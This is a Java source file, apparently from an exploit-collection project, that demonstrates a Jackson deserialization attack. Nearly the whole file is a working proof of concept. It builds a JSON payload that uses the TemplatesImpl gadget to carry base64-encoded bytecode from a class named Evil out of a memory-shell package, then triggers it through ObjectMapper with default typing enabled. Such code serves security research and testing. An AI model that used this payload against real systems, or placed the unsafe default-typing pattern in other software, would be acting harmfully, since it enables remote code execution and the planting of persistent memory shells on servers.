package xyz.eki.marshalexp.solution;


import com.fasterxml.jackson.databind.ObjectMapper;
import xyz.eki.marshalexp.memshell.Evil;
import xyz.eki.marshalexp.utils.MiscUtils;
import org.apache.xalan.lib.sql.JNDIConnectionPool;

//http://www.lmxspace.com/2019/07/30/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B1%87%E6%80%BB/
public class JacksonWays {
    public static class User {
        private String name;
        private Object object;


        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public Object getObject() {
            return object;
        }
        public void setObject(Object object) {
            this.object = object;
        }
    }


    //dep org.apache.xalan.xsltc.trax.TemplatesImpl
    public static void case1() throws Exception{
        final String NASTY_CLASS = "org.apache.xalan.xsltc.trax.TemplatesImpl";
        String evilCode = MiscUtils.base64Encode(MiscUtils.dumpClass(Evil.class));
        final String jsonInput = aposToQuotes(
                "{"
                        + " 'object':[ '" + NASTY_CLASS + "',\n"
                        + "  {\n"
                        + "    'transletBytecodes' : [ '" + evilCode + "' ],\n"
                        + "    'transletName' : 'a.b',\n"
                        + "    'outputProperties' : { }\n"
                        + "  }\n"
                        + " ]\n"
                        + "}"
        );

        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        User user;
        try {
            user = mapper.readValue(jsonInput, User.class);
            System.out.println(user.getName());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }

    public static void main(String[] args) throws Exception{
        case1();


    }
}
